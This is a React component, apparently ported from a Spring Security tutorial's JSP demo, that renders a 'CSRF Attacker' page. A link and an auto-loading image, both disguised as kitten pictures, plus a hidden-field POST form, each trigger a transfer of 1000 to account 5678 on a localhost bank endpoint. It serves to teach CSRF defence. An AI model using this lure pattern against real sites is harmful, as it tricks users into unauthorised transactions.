import React from 'react';

const CsrfAttacker: React.FC = () => {
  // The source JSP contains a form with hidden inputs (accountNo, amount) and a submit button.
  // Since the inputs are hidden and have static values, we do not need controlled state for them.
  // We simply render the form with the exact action, method, and hidden fields as in the source.
  
  const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    // The source form submits to a hardcoded URL.
    // In a real migration, this would likely be handled by the backend or a proxy,
    // but to preserve 100% fidelity of the "attacker" behavior, we allow the default submission.
    // However, since this is a demo of a CSRF attack vector, we might want to prevent default
    // and simulate the request, or just let it go. The source allows default behavior.
    // We will let it submit naturally to preserve the exact behavior of the legacy page.
  };

  return (
    <div className="modern-container">
      <div className="modern-card">
        <h1 className="card-title">CSRF Attacker</h1>
        
        <div className="form-group">
          <a 
            href="http://localhost:8080/spring-security-rest-full/transfer?accountNo=5678&amount=1000" 
            className="btn btn-secondary"
          >
            Show Kittens Pictures
          </a>
        </div>

        <div className="form-group">
          <img 
            src="http://localhost:8080/spring-security-rest-full/transfer?accountNo=5678&amount=1000" 
            alt="Kittens"
            style={{ maxWidth: '100%', height: 'auto' }}
          />
        </div>

        <form 
          action="http://localhost:8080/spring-security-rest-full/transfer" 
          method="POST"
          onSubmit={handleFormSubmit}
        >
          <input name="accountNo" type="hidden" value="5678" />
          <input name="amount" type="hidden" value="1000" />
          <button type="submit" className="btn btn-primary">
            Show Kittens Picture
          </button>
        </form>
      </div>
    </div>
  );
};

export default CsrfAttacker;